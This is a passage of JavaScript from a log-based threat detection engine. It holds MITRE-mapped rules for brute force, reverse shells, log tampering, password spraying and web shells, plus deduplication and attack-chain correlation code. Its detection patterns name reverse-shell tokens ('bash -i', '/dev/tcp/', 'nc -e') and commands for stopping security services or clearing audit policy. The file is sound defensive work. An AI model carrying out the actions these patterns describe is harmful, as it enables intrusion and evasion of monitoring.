            match: e => parseInt(e.EventID,10)===3 && (parseInt(e.DestinationPort,10)||parseInt(e.destPort,10))===443 && !/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(e.DestinationIP||'') },
          { id: 'CSDE-WIN-022-NONST', title: 'C2 via Non-Standard Port',
            match: e => {
              const eid = parseInt(e.EventID,10);
              const port = parseInt(e.DestinationPort||e.destPort||'0', 10);
              const ip = e.DestinationIP||'';
              const notPriv = ip && !/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip);
              return eid===3 && notPriv && ![80,443,8080,8443].includes(port) && port > 1024;
            } },
        ],
      },

      // ── LINUX RULES ───────────────────────────────────────────

      {
        id: 'CSDE-LNX-001', title: 'SSH Brute Force Attempt (Linux)',
        os: 'linux', severity: 'high', category: 'authentication', logCategory: 'linux_syslog',
        mitre: { technique: 'T1110.003', name: 'Password Spraying', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1110.003'],
        riskScore: 65,
        match: e => {
          const msg = (e.message||e.msg||e.raw||'').toLowerCase();
          return msg.includes('failed password') || msg.includes('invalid user') ||
                 msg.includes('authentication failure') || msg.includes('connection closed by');
        },
        narrative: e => `SSH brute force indicator on ${e.computer||e.hostname||'unknown'}: "${(e.message||'?').slice(0,120)}"`,
      },

      {
        id: 'CSDE-LNX-002', title: 'Sudo Privilege Escalation (Linux)',
        os: 'linux', severity: 'high', category: 'privilege-escalation', logCategory: 'linux_syslog',
        mitre: { technique: 'T1548.003', name: 'Sudo and Sudo Caching', tactic: 'privilege-escalation' },
        tags: ['attack.privilege_escalation', 'attack.t1548.003'],
        riskScore: 72,
        match: e => {
          const msg = (e.message||e.msg||e.raw||'').toLowerCase();
          return msg.includes('sudo') && (msg.includes('root') || msg.includes('tty=') || msg.includes('command='));
        },
        narrative: e => `Sudo privilege escalation on ${e.computer||'unknown'}: "${(e.message||'?').slice(0,120)}"`,
      },

      {
        id: 'CSDE-LNX-003', title: 'Suspicious Cron Job Modification (Linux)',
        os: 'linux', severity: 'medium', category: 'persistence', logCategory: 'linux_syslog',
        mitre: { technique: 'T1053.003', name: 'Cron', tactic: 'persistence' },
        tags: ['attack.persistence', 'attack.t1053.003'],
        riskScore: 58,
        match: e => {
          const msg  = (e.message||e.msg||e.raw||'').toLowerCase();
          const proc = (e.process||e.ProcessName||e.Image||'').toLowerCase();
          return (msg.includes('cron') && (msg.includes('modified') || msg.includes('added') || msg.includes('NEW JOB'))) ||
                 proc.includes('crontab');
        },
        narrative: e => `Cron job modified/created on ${e.computer||'unknown'}: "${(e.message||'?').slice(0,120)}"`,
      },

      {
        id: 'CSDE-LNX-004', title: 'Reverse Shell Indicator (Linux)',
        os: 'linux', severity: 'critical', category: 'command-and-control', logCategory: 'linux_auditd',
        mitre: { technique: 'T1059.004', name: 'Unix Shell', tactic: 'execution' },
        tags: ['attack.execution', 'attack.t1059.004', 'attack.command_and_control'],
        riskScore: 95,
        match: e => {
          const cmd = (e.commandLine||e.message||e.msg||e.raw||'').toLowerCase();
          return cmd.includes('bash -i') || cmd.includes('/dev/tcp/') ||
                 cmd.includes('nc -e') || cmd.includes('ncat -e') ||
                 (cmd.includes('python') && cmd.includes('socket') && cmd.includes('os.dup2'));
        },
        narrative: e => `Reverse shell indicator on ${e.computer||'unknown'}: "${(e.commandLine||e.message||'?').slice(0,120)}"`,
      },

      // ══════════════════════════════════════════════════════════════
      // REMEDIATION v7 — NEW CRITICAL RULES
      // ══════════════════════════════════════════════════════════════

      // ── LOG TAMPERING RULES (auto-escalate to P1) ─────────────────

      {
        id: 'CSDE-WIN-023', title: 'Security Audit Log Cleared (Log Tampering)',
        os: 'windows', severity: 'critical', category: 'defense-evasion',
        logCategory: 'windows_tamper',
        // P1 escalation flag: log-clearing is definitive compromise indicator
        p1Escalate: true,
        mitre: { technique: 'T1070.001', name: 'Indicator Removal: Clear Windows Event Logs', tactic: 'defense-evasion' },
        tags: ['attack.defense_evasion', 'attack.t1070.001', 'log_tampering', 'p1'],
        riskScore: 100,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          // EventID 1102 = Security log cleared; 1100 = audit log service stopped
          return eid === 1102 || eid === 1100;
        },
        narrative: e => {
          const eid = parseInt(e.EventID, 10);
          return eid === 1102
            ? `⚠️ P1-ESCALATION: Security event log CLEARED by "${e.user||'unknown'}" on ${e.computer||'unknown'}. ` +
              `This is a definitive evidence-destruction action. Immediate isolation and forensic acquisition required.`
            : `⚠️ P1-ESCALATION: Windows Event Log service STOPPED on ${e.computer||'unknown'}. ` +
              `Log collection interrupted — possible pre-attack log-tampering.`;
        },
      },

      {
        id: 'CSDE-WIN-024', title: 'Audit Policy Tampered (Log Tampering)',
        os: 'windows', severity: 'critical', category: 'defense-evasion',
        logCategory: 'windows_tamper',
        p1Escalate: true,
        mitre: { technique: 'T1562.002', name: 'Impair Defenses: Disable Windows Event Logging', tactic: 'defense-evasion' },
        tags: ['attack.defense_evasion', 'attack.t1562.002', 'log_tampering', 'p1'],
        riskScore: 98,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          const cmd = (e.commandLine || '').toLowerCase();
          // EventID 4719 = system audit policy changed; 4906 = CrashOnAuditFail changed
          // Also catch auditpol.exe disabling via command line
          return eid === 4719 || eid === 4906 ||
                 (eid === 4688 && cmd.includes('auditpol') && (cmd.includes('/set') || cmd.includes('/clear') || cmd.includes('disable')));
        },
        narrative: e => {
          const eid = parseInt(e.EventID, 10);
          return eid === 4719
            ? `⚠️ P1-ESCALATION: System audit policy MODIFIED by "${e.user||'unknown'}" on ${e.computer||'unknown'}. ` +
              `Attackers disable auditing to evade detection. MITRE T1562.002.`
            : `⚠️ P1-ESCALATION: Audit policy manipulation via "${e.commandLine||'auditpol'}" on ${e.computer||'unknown'} ` +
              `by "${e.user||'unknown'}". Definitive defense-evasion action.`;
        },
      },

      {
        id: 'CSDE-WIN-027', title: 'Security Service / Event Log Service Stopped',
        os: 'windows', severity: 'critical', category: 'defense-evasion',
        logCategory: 'windows_tamper',
        p1Escalate: true,
        mitre: { technique: 'T1489', name: 'Service Stop', tactic: 'impact' },
        tags: ['attack.impact', 'attack.t1489', 'log_tampering', 'p1'],
        riskScore: 95,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          const cmd = (e.commandLine || '').toLowerCase();
          const svcName = (e.ServiceName || e.param1 || e.message || '').toLowerCase();
          // Service stopped events
          if (eid === 7036 && (svcName.includes('eventlog') || svcName.includes('windows event log') ||
              svcName.includes('security center') || svcName.includes('defender') ||
              svcName.includes('sense') || svcName.includes('wdnissvc'))) return true;
          // net stop / sc stop security services via process creation
          if (eid === 4688 && (cmd.includes('net stop') || cmd.includes('sc stop') || cmd.includes('sc config')) &&
              (cmd.includes('eventlog') || cmd.includes('windefend') || cmd.includes('sense') ||
               cmd.includes('defender') || cmd.includes('mssecflt') || cmd.includes('securityhealthservice'))) return true;
          return false;
        },
        narrative: e => `⚠️ P1-ESCALATION: Security-critical service STOPPED — "${e.ServiceName||e.commandLine||'?'}" on ${e.computer||'unknown'} ` +
          `by "${e.user||'unknown'}". Disabling event logging or AV is a pre-attack defense-evasion step.`,
      },

      // ── PASSWORD SPRAY DETECTION (cross-user, same source IP) ───────

      {
        id: 'CSDE-WIN-025', title: 'Password Spray Attack (Multiple Users, Same Source)',
        os: 'windows', severity: 'critical', category: 'credential-access',
        logCategory: 'windows_auth',
        mitre: { technique: 'T1110.003', name: 'Password Spraying', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1110.003'],
        riskScore: 96,
        match: () => false, // batch only
        matchBatch: (events) => {
          const fails = events.filter(e => parseInt(e.EventID,10) === 4625);
          if (fails.length < 3) return null;

          // Group failures by source IP: password spray = one IP → many users
          const byIp = new Map();
          fails.forEach(e => {
            const ip = e.srcIp || e.SourceIP || e.IpAddress || '';
            if (!ip || ip === '127.0.0.1' || ip === '::1' || ip === '-') return;
            if (!byIp.has(ip)) byIp.set(ip, new Map());
            const users = byIp.get(ip);
            const u = (e.user || '?').toLowerCase();
            if (!users.has(u)) users.set(u, []);
            users.get(u).push(e);
          });

          const results = [];
          byIp.forEach((userMap, srcIp) => {
            const uniqueUsers = userMap.size;
            if (uniqueUsers < 3) return; // Need >= 3 distinct users from same IP = spray

            const allEvts = [...userMap.values()].flat();
            const userList = [...userMap.keys()];
            const hosts = [...new Set(allEvts.map(e => e.computer || '?'))];

            // Time-span analysis
            const times = allEvts.map(e => new Date(e.timestamp||0).getTime()).filter(t=>t>0).sort();
            const spanMs = times.length >= 2 ? times[times.length-1] - times[0] : 0;
            const ratePerMin = spanMs > 0 ? (allEvts.length / (spanMs/60000)).toFixed(1) : '?';

            results.push({
              id: `CSDE-WIN-025-${srcIp}`,
              ruleId: 'CSDE-WIN-025', ruleName: 'Password Spray Attack (Multiple Users, Same Source)',
              severity: 'critical',
              user: userList.slice(0,5).join(','),
              computer: hosts[0] || '', srcIp,
              mitre: { technique: 'T1110.003', name: 'Password Spraying', tactic: 'credential-access' },
              tags: ['attack.credential_access', 'attack.t1110.003'],
              riskScore: Math.min(70 + uniqueUsers * 5, 96),
              evidence: allEvts.slice(0,10),
              narrative: `PASSWORD SPRAY from ${srcIp}: ${allEvts.length} failures across ${uniqueUsers} distinct user accounts ` +
                         `(${userList.slice(0,5).join(', ')}${uniqueUsers>5?'…':''}) on ${hosts.join(',')} ` +
                         `— rate ${ratePerMin} attempts/min. Classic T1110.003 password-spray pattern.`,
              timestamp: allEvts[0]?.timestamp,
              sprayMeta: { srcIp, uniqueUsers, totalAttempts: allEvts.length, spanMs, ratePerMin, userList, hosts },
            });
          });
          return results.length ? results : null;
        },
        narrative: () => '',
      },

      // ── CREDENTIAL STUFFING (many accounts, multiple IPs, rapid) ────

      {
        id: 'CSDE-WIN-026', title: 'Credential Stuffing Attack (High-Volume Multi-Account)',
        os: 'windows', severity: 'high', category: 'credential-access',
        logCategory: 'windows_auth',
        mitre: { technique: 'T1110.004', name: 'Credential Stuffing', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1110.004'],
        riskScore: 88,
        match: () => false, // batch only
        matchBatch: (events) => {
          const fails = events.filter(e => parseInt(e.EventID,10) === 4625);
          if (fails.length < 10) return null; // needs volume

          // Credential stuffing: many accounts, many source IPs, rapid rate
          const byUser = new Map();
          const ipSet  = new Set();
          fails.forEach(e => {
            const u = (e.user||'?').toLowerCase();
            const ip = e.srcIp||'';
            if (!byUser.has(u)) byUser.set(u, []);
            byUser.get(u).push(e);
            if (ip && ip !== '127.0.0.1') ipSet.add(ip);
          });

          const uniqueUsers = byUser.size;
          const uniqueIps   = ipSet.size;
          // Credential stuffing = many users, possibly many IPs (botnet)
          if (uniqueUsers < 5 || (uniqueIps === 1 && uniqueUsers < 10)) return null;

          const times = fails.map(e=>new Date(e.timestamp||0).getTime()).filter(t=>t>0).sort();
          const spanMs = times.length>=2 ? times[times.length-1]-times[0] : 0;
          const ratePerMin = spanMs > 0 ? (fails.length/(spanMs/60000)).toFixed(1) : '?';

          return [{
            id: 'CSDE-WIN-026-batch',
            ruleId: 'CSDE-WIN-026', ruleName: 'Credential Stuffing Attack (High-Volume Multi-Account)',
            severity: 'high',
            user: [...byUser.keys()].slice(0,3).join(','),
            computer: fails[0]?.computer || '', srcIp: fails[0]?.srcIp || '',
            mitre: { technique: 'T1110.004', name: 'Credential Stuffing', tactic: 'credential-access' },
            tags: ['attack.credential_access', 'attack.t1110.004'],
            riskScore: Math.min(50 + uniqueUsers * 2 + uniqueIps * 3, 88),
            evidence: fails.slice(0,10),
            narrative: `CREDENTIAL STUFFING: ${fails.length} failures across ${uniqueUsers} users from ${uniqueIps} source IP(s) ` +
                       `— rate ${ratePerMin} attempts/min. Likely automated credential-list attack (T1110.004).`,
            timestamp: fails[0]?.timestamp,
          }];
        },
        narrative: () => '',
      },

      // ── WSL / UNIX-ON-WINDOWS DETECTION ──────────────────────────

      {
        id: 'CSDE-WIN-028', title: 'Windows Subsystem for Linux (WSL) Execution',
        os: 'windows', severity: 'medium', category: 'execution',
        // No logCategory — fires on any Windows process creation event
        mitre: { technique: 'T1202', name: 'Indirect Command Execution', tactic: 'defense-evasion' },
        tags: ['attack.defense_evasion', 'attack.t1202', 'wsl'],
        riskScore: 65,
        match: e => {
          if (parseInt(e.EventID,10) !== 4688) return false;
          const proc = (e.process||e.Image||e.NewProcessName||e.ProcessName||'').toLowerCase();
          const cmd  = (e.commandLine||'').toLowerCase();
          // bash.exe, wsl.exe, wslhost.exe, ubuntu.exe etc.
          return proc.includes('bash.exe') || proc.includes('wsl.exe') || proc.includes('wslhost') ||
                 proc.includes('ubuntu') || proc.includes('kali') || proc.includes('debian') ||
                 cmd.includes('wsl.exe') || cmd.includes('bash.exe') || cmd.includes('wsl --') ||
                 // WSL-specific paths
                 proc.includes('\\wsl\\') || cmd.includes('/mnt/c/');
        },
        narrative: e => `WSL/Unix-on-Windows execution on ${e.computer||'unknown'}: "${e.process||'?'}" — ` +
          `Command: "${(e.commandLine||'?').slice(0,150)}". May be used to bypass Windows security controls.`,
      },

      // ── EXPLOIT → EXECUTION → PERSISTENCE CHAIN (single-event anchor) ─

      {
        id: 'CSDE-WIN-029', title: 'Public-Facing Exploit / Web Shell Execution',
        os: 'windows', severity: 'critical', category: 'initial-access',
        // No logCategory — matches IIS/web server process spawning shells
        mitre: { technique: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'initial-access' },
        tags: ['attack.initial_access', 'attack.t1190', 'webshell'],
        riskScore: 97,
        match: e => {
          if (parseInt(e.EventID,10) !== 4688) return false;
          const parent = (e.parentProcess||e.ParentImage||e.ParentProcessName||'').toLowerCase();
          const proc   = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          const cmd    = (e.commandLine||'').toLowerCase();
          // Web server / app pool spawning suspicious shells
          const webParents = ['w3wp.exe','httpd.exe','apache','nginx','tomcat','jboss','websphere',
                              'iisexpress.exe','inetinfo.exe','php-cgi.exe','php.exe','node.exe'];
          const isWebParent = webParents.some(p => parent.includes(p));
          if (!isWebParent) return false;
          // Suspicious child processes from web parent
          const suspChildren = ['cmd.exe','powershell','wscript','cscript','mshta','rundll32',
                                'net.exe','net1.exe','certutil','bitsadmin','reg.exe','whoami'];
          return suspChildren.some(s => proc.includes(s)) ||
                 cmd.includes('whoami') || cmd.includes('/add') || cmd.includes('download');
        },
        narrative: e => `⚠️ WEB SHELL / EXPLOIT: Web server "${e.parentProcess||'?'}" spawned "${e.process||'?'}" on ${e.computer||'unknown'}. ` +
          `Command: "${(e.commandLine||'?').slice(0,200)}". Classic web-shell execution pattern (T1190).`,
      },

    ];

    // ════════════════════════════════════════════════════════════════
    //  DEDUPLICATION ENGINE
    //  Groups detections by: normalized_rule_base + host + user
    //  within a sliding DEDUP_WINDOW_MS time window.
    //  Returns aggregated detection objects with:
    //    detection_name      — base rule name (no variant suffix)
    //    variants_triggered  — array of distinct variant IDs seen
    //    event_count         — total raw events contributing
    //    first_seen / last_seen
    //    aggregated_severity — highest severity among variants
    //    confidence_score    — 0–100 derived from event_count, variant_count, behavioral_diversity
    //    raw_detections      — original un-aggregated detection objects (for drill-down)
    // ════════════════════════════════════════════════════════════════
    function _dedupDetections(rawDetections) {
      if (!rawDetections.length) return [];

      // ── Step 1: Sort by timestamp ascending (O(n log n)) ──────────
      const sorted = [...rawDetections].sort((a, b) => {
        const ta = new Date(a.timestamp || a.first_seen || 0).getTime();
        const tb = new Date(b.timestamp || b.first_seen || 0).getTime();
        return ta - tb;
      });

      // ── Step 2: Build dedup buckets ───────────────────────────────
      // Key = canonical rule slug + host + user
      // Grouping logic:
      //   • Events from same session (same upload batch) always group regardless
      //     of timestamp span — prevents duplicate spam on long-duration logs
      //   • Time-window only applied when merging ACROSS separate sessions
      // ─────────────────────────────────────────────────────────────
      const buckets = new Map();

      sorted.forEach(det => {
        // Canonical slug uses ruleId if available, else title-based slug
        const slug     = _canonicalSlug(det);
        const host     = (det.computer || det.host || '').toLowerCase().trim();
        const user     = (det.user || '').toLowerCase().trim();
        const ts       = new Date(det.timestamp || det.first_seen || 0).getTime();

        // Primary bucket key: slug + host + user (groups all variants of same rule per entity)
        const bucketKey = `${slug}|${host}|${user}`;

        if (!buckets.has(bucketKey)) {
          buckets.set(bucketKey, null); // sentinel before first detection
        }

        const existing = buckets.get(bucketKey);

        if (existing !== null && existing !== undefined) {
          // ── Merge into existing aggregated detection ──────────────
          const prevTs   = new Date(existing.last_seen || existing.first_seen || 0).getTime();
          const timeDiff = ts - prevTs;

          // Only split into new window if BOTH:
          //   a) time gap > DEDUP_WINDOW_MS, AND
          //   b) this is NOT an already-aggregated detection (event_count > 1 means
          //      it came from a prior dedup pass — always merge it)
          const isAlreadyAgg = (det.event_count || 0) > 1 ||
                               Array.isArray(det.variants_triggered) && det.variants_triggered.length > 0;
          const shouldSplit  = !isAlreadyAgg && timeDiff > CFG.DEDUP_WINDOW_MS * 5; // 5 min hard cap

          if (!shouldSplit) {
            // Merge
            const addCount = det.event_count || (det.evidence ? det.evidence.length : 1);
            existing.event_count += addCount;
            if (ts > new Date(existing.last_seen || 0).getTime()) {
              existing.last_seen = det.timestamp || det.last_seen || existing.last_seen;
            }

            // Track variant IDs
            const incomingVariants = Array.isArray(det.variants_triggered)
              ? det.variants_triggered
              : [det.variantId || det.id || slug];
            incomingVariants.forEach(v => {
              if (v && !existing.variants_triggered.includes(v)) {
                existing.variants_triggered.push(v);
              }
            });

            // Severity escalation (keep highest)
            const newW = SEV_WEIGHT[det.severity] || SEV_WEIGHT[det.aggregated_severity] || 0;
            const curW = SEV_WEIGHT[existing.aggregated_severity] || 0;
            if (newW > curW) {
              existing.aggregated_severity = det.severity || det.aggregated_severity || existing.aggregated_severity;
              existing.severity = existing.aggregated_severity;
            }

            // Risk score escalation
            const inRisk = det.riskScore || 0;
            if (inRisk > existing.riskScore) existing.riskScore = inRisk;

            // Behavioral diversity: distinct EventIDs
            (det.evidence || []).forEach(ev => {
              const eid = String(ev.EventID || ev.eventId || ev.event_id || '');
              if (eid) {
                const ekey = eid + ':' + String(ev.Computer || ev.computer || ev.hostname || '');
                if (!existing._seenEventIds.has(ekey)) existing._seenEventIds.add(ekey);
              }
            });

            // Accumulate raw evidence (capped)
            if (existing.raw_detections.length < CFG.MAX_EVIDENCE_STORED) {
              existing.raw_detections.push(det);
            }

            // Absorb richer narrative
            if (det.narrative && det.narrative.length > (existing.narrative || '').length) {
              existing.narrative = det.narrative;
            }
            return; // merged — do not create new bucket entry
          }
          // If shouldSplit, fall through to create second window bucket
          // Use a time-keyed sub-bucket so we don't overwrite the first
          const subKey = `${bucketKey}|W${Math.floor(ts / (CFG.DEDUP_WINDOW_MS * 5))}`;
          if (!buckets.has(subKey)) {
            // Create a new window bucket
            buckets.set(subKey, _newAggEntry(det, slug));
            return;
          }
          // Merge into existing sub-window
          const subBucket = buckets.get(subKey);
          if (subBucket) {
            subBucket.event_count += det.event_count || 1;
            if (ts > new Date(subBucket.last_seen || 0).getTime()) subBucket.last_seen = det.timestamp || subBucket.last_seen;
          }
          return;
        }

        // No existing bucket — create first entry
        buckets.set(bucketKey, _newAggEntry(det, slug));
      });

      // ── Step 3: Flatten buckets and compute confidence ────────────
      const aggregated = [];
      buckets.forEach(agg => {
        if (!agg) return; // skip null sentinels
        agg.confidence_score = _calcConfidence(agg);
        delete agg._seenEventIds; // clean internal field
        aggregated.push(agg);
      });

      // Sort: risk desc, then first_seen asc
      aggregated.sort((a, b) =>
        (b.riskScore - a.riskScore) || (new Date(a.first_seen) - new Date(b.first_seen))
      );
      return aggregated;
    }

    // ── Create a new aggregated detection entry ──────────────────
    function _newAggEntry(det, slug) {
      const baseId   = _baseRuleId(det.ruleId || det.id || slug);
      const ruleName = _normalizeRuleName(det.detection_name || det.ruleName || det.title || baseId);
      const evidenceEvents = det.evidence || [];
      const seenIds = new Set(
        evidenceEvents.map(ev =>
          String(ev.EventID || ev.eventId || ev.event_id || '') +
          ':' + String(ev.Computer || ev.computer || ev.hostname || '')
        )
      );
      const initVariants = Array.isArray(det.variants_triggered) && det.variants_triggered.length
        ? [...det.variants_triggered]
        : [det.variantId || det.id || baseId];

      return {
        id             : `AGG-${baseId}-${Date.now()}-${Math.random().toString(36).slice(2,6)}`,
        ruleId         : det.ruleId || baseId,
        ruleName,
        title          : ruleName,
        detection_name : ruleName,
        variants_triggered : initVariants,
        event_count    : det.event_count || det.count || (det.evidence ? det.evidence.length : 1),
        first_seen     : det.timestamp || det.first_seen,
        last_seen      : det.last_seen || det.timestamp,
        aggregated_severity : det.severity || det.aggregated_severity || 'medium',
        severity       : det.severity || det.aggregated_severity || 'medium',
        riskScore      : det.riskScore || 0,
        computer       : det.computer || det.host || '',
        host           : det.computer || det.host || '',
        user           : det.user || '',
        srcIp          : det.srcIp || det.src_ip || '',
        commandLine    : det.commandLine || '',
        process        : det.process || '',
        mitre          : det.mitre || null,
        technique      : det.mitre?.technique || det.technique || '',
        tags           : det.tags || [],
        category       : det.category || '',
        narrative      : det.narrative || '',
        description    : det.description || '',
        raw_detections : [det],
        _seenEventIds  : seenIds,
        timestamp      : det.timestamp || det.first_seen,
        confidence_score: 30, // placeholder; recalculated at end
      };
    }

    // ── Confidence score formula ──────────────────────────────────
    // confidence = weighted average of:
    //   event_count factor     (50%): log-scaled, saturates at 15 events
    //   variant_count factor   (25%): more variants = higher confidence
    //   behavioral_diversity   (25%): from raw_detections count
    function _calcConfidence(agg) {
      const cnt       = agg.event_count || 1;
      const evFactor  = Math.min(Math.log2(cnt + 1) / Math.log2(16), 1.0);  // 15 events → max
      const varFactor = Math.min((agg.variants_triggered.length - 1) / 3, 1.0);  // 4 variants = max
      const divFactor = Math.min((agg.raw_detections.length - 1) / 4, 1.0);
      const raw = 0.50 * evFactor + 0.25 * varFactor + 0.25 * divFactor;
      // Scale to 30-100 so even single-event detections are credible
      return Math.round(30 + raw * 70);
    }

    // ════════════════════════════════════════════════════════════════
    //  OS FILTERING
    //  Ensures Windows rules never fire on Linux events and vice versa.
    //  'any' rules always pass.
    // ════════════════════════════════════════════════════════════════
    function _osMatch(rule, event) {
      if (rule.os === 'any' || !rule.os) return true;
      const evOs = event._os || _detectOS(event);
      if (evOs === 'unknown') return true; // can't determine — allow
      return rule.os === evOs;
    }

    // ════════════════════════════════════════════════════════════════
    //  TIME-BASED CORRELATION ENGINE
    //  Groups related detections within CHAIN_MAX_GAP_MS into attack chains.
    //  Uses O(n log n) sort + O(n) sweep.
    // ════════════════════════════════════════════════════════════════
    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — ADVERSARY-CENTRIC ATTACK CHAIN BUILDER
    //  Replaces named-pattern chains with dynamic DAG-based chain
    //  reconstruction per adversary bucket.
    //  Each chain = one adversary's full path across all hosts/stages.
    //  Includes: causal ordering, phase sequence, cross-host stitching,
    //  multi-factor scoring, full MITRE per stage, forensic timeline.
    // ════════════════════════════════════════════════════════════════
    function _buildAttackChain(dedupDets, events) {
      if (!dedupDets.length) return [];
      const chains = [];

      // Build adversary buckets (same logic as correlation engine)
      const rawBuckets  = _buildAdversaryBuckets(dedupDets);
      const mergedBuckets = _mergeFragmentedChains(rawBuckets);

      mergedBuckets.forEach((bucket, bi) => {
        if (bucket.length < 1) return;

        // FP suppression for chain display
        const filtered = bucket.filter(d => {
          const sev = d.aggregated_severity || d.severity || 'low';
          if (sev === 'critical' || sev === 'high') return true;
          const ev = (d.raw_detections || [d])[0];
          const fp = ev ? _checkFPSuppression(ev, d.ruleId || '') : { suppressed: false };
          return !fp.suppressed;
        });
        if (!filtered.length) return;

        // Build causal DAG
        const dag = _buildCausalDAG(filtered);

        // Collect entities (hosts, users, IPs)
        const entities  = [...new Set(filtered.map(d => d.computer || d.host || d.user).filter(Boolean))];
        const allHosts  = [...new Set(filtered.map(d => d.computer || d.host || '').filter(Boolean))];
        const allUsers  = [...new Set(filtered.map(d => d.user || '').filter(Boolean))];
        const allSrcIps = [...new Set(filtered.map(d => d.srcIp || '').filter(Boolean))];
        const crossHost = allHosts.length > 1;

        // Techniques and tactics
        const techniques  = [...new Set(filtered.map(d => d.mitre?.technique || d.technique || '').filter(Boolean))];
        const mitreTactics= [...new Set(filtered.map(d => d.mitre?.tactic || d.category || '').filter(Boolean))];

        // Compute ACE score
        const intentSignals = filtered.map(d => {
          const ev = (d.raw_detections || [d])[0] || {};
          return _classifyIntent(ev, d);
        });
        const parent   = filtered.reduce((best, d) => (d.riskScore||0) > (best.riskScore||0) ? d : best, filtered[0]);
        const aceScore = _computeACEScore(filtered, dag, crossHost, intentSignals, parent);

        // Determine chain type from phase sequence
        let chainType = 'generic';
        let chainName = '';
        const phases = dag.phaseSequence;
        const hasRansomware  = techniques.some(t => t === 'T1486' || t === 'T1490');
        const hasCredDump    = techniques.some(t => t.startsWith('T1003'));
        const hasLateral     = phases.includes('lateral-movement') || crossHost;
        const hasExecution   = phases.includes('execution');
        const hasPersistence = phases.includes('persistence');
        const hasInitial     = phases.includes('initial-access') || phases.includes('credential-access');
        const hasLogTamper   = techniques.some(t => t === 'T1070.001' || t === 'T1070');

        // Priority order: full APT first, then ransomware, then sub-chains
        if (hasRansomware && hasCredDump && hasLateral) {
          chainType = 'full-apt-ransomware';
          chainName = 'Full APT Kill Chain — Credential Theft → Lateral Movement → Ransomware';
        } else if (hasRansomware && hasLateral) {
          chainType = 'ransomware-apt';
          chainName = 'APT Ransomware — Lateral Movement → Ransomware';
        } else if (hasRansomware) {
          chainType = 'ransomware';
          chainName = 'Ransomware Kill Chain';
        } else if (hasCredDump && hasLateral) {
          chainType = 'apt';
          chainName = 'APT — Credential Theft → Lateral Movement';
        } else if (hasCredDump && hasPersistence && hasExecution) {
          chainType = 'apt';
          chainName = 'APT — Credential Access → Execution → Persistence';
        } else if (hasCredDump) {
          chainType = 'credential-theft';
          chainName = 'Credential Theft Chain';
        } else if (hasLateral && hasInitial) {
          chainType = 'apt';
          chainName = 'APT — Initial Access → Lateral Movement';
        } else if (hasLateral) {
          chainType = 'lateral-movement';
          chainName = 'Cross-Host Lateral Movement Chain';
        } else if (hasInitial && hasExecution && hasPersistence) {
          chainType = 'initial-compromise';
          chainName = 'Initial Compromise → Execution → Persistence';
        } else if (phases.includes('credential-access') && hasExecution) {
          chainType = 'credential-exec';
          chainName = 'Credential Access → Execution Chain';
        } else if (phases.length >= 3) {
          chainType = 'multi-stage';
          chainName = `Multi-Stage Attack (${phases.length} phases)`;
        } else {
          chainName = `Attack Chain — ${entities[0] || 'Unknown Host'}`;
        }

        // Build stages array (DAG nodes in STRICT CHRONOLOGICAL order)
        // NEVER re-sort stages by phase-order — that would invert cause/effect
        const stages = dag.nodes.map((d, si) => ({
          ...d,
          stageIndex   : si,
          tactic       : d.mitre?.tactic || d.category || 'unknown',
          phase        : _tacticToPhase(d.mitre?.tactic || d.category || ''),
          technique    : d.mitre?.technique || d.technique || '',
          techniqueName: d.mitre?.name || '',
          host         : d.computer || d.host || '',
          user         : d.user || '',
          confidence   : (dag.stageConfidence && dag.stageConfidence[si] != null)
                           ? dag.stageConfidence[si]
                           : (d.riskScore || 30),
          hasCausalViolation: (dag.causalViolations || []).some(
            v => v.stage_a.index === si || v.stage_b.index === si
          ),
          enrichment   : (d.raw_detections || [d]).flatMap(rd =>
            (rd.evidence || [rd]).slice(0,2).map(ev => _enrichEventDetail(ev || {}))
          ).slice(0,3),
        }));

        // Forensic timestamps
        let firstMs = Infinity, lastMs = -Infinity;
        filtered.forEach(d => {
          const fs = new Date(d.first_seen || d.timestamp || 0).getTime();
          const ls = new Date(d.last_seen  || d.first_seen || d.timestamp || 0).getTime();
          if (fs > 0 && fs < firstMs) firstMs = fs;
          if (ls > 0 && ls > lastMs)  lastMs  = ls;
        });
        if (firstMs === Infinity) firstMs = new Date(parent.first_seen || parent.timestamp || 0).getTime();
        if (lastMs === -Infinity) lastMs  = firstMs;
        if (lastMs <= firstMs && filtered.length > 1) lastMs = firstMs + filtered.length * 500;

        const severity = filtered.reduce((best, d) => {
          const w = SEV_WEIGHT[d.aggregated_severity || d.severity] || 0;
          return w > (SEV_WEIGHT[best] || 0) ? (d.aggregated_severity || d.severity) : best;
        }, 'low');

        chains.push({
          id          : `CHAIN-ACE-${bi+1}`,
          name        : chainName,
          type        : chainType,
          severity,
          stages,
          entities,
          allHosts,
          allUsers,
          allSrcIps,
          crossHost,
          techniques,
          mitreTactics,
          riskScore   : aceScore.score,
          severityBand: aceScore.severityBand,
          description : `${filtered.length} correlated detections across ${allHosts.length} host${allHosts.length>1?'s':''} ` +
                        `forming a ${phases.length}-phase attack chain. Cross-host: ${crossHost}.`,
          timestamp   : firstMs > 0 ? new Date(firstMs).toISOString() : (parent.timestamp || new Date().toISOString()),
          last_seen   : lastMs  > 0 ? new Date(lastMs).toISOString()  : null,
          duration_ms : Math.max(0, lastMs - firstMs),
          durationLabel: _formatDuration(Math.max(0, lastMs - firstMs)),
          dag         : {
            phaseSequence   : dag.phaseSequence,
            nodeCount       : dag.nodes.length,
            edgeCount       : dag.edges.length,
            crossHost       : dag.crossHost,
            causalViolations: dag.causalViolations || [],
            causallyClean   : dag.causallyClean !== false,
            stageConfidence : dag.stageConfidence || [],
          },
          // Chain validity: no causal ordering violations, no OS mismatches
          chainValid        : (dag.causalViolations || []).length === 0,
          causalViolations  : dag.causalViolations || [],
          aceScore,
          intentSignals: {
            attackerCount: intentSignals.filter(s => s.intent === 'attacker').length,
            adminCount   : intentSignals.filter(s => s.intent === 'admin').length,
          },
        });
      });

      // Sort by riskScore descending
      return chains.sort((a, b) => (b.riskScore || 0) - (a.riskScore || 0));
    }

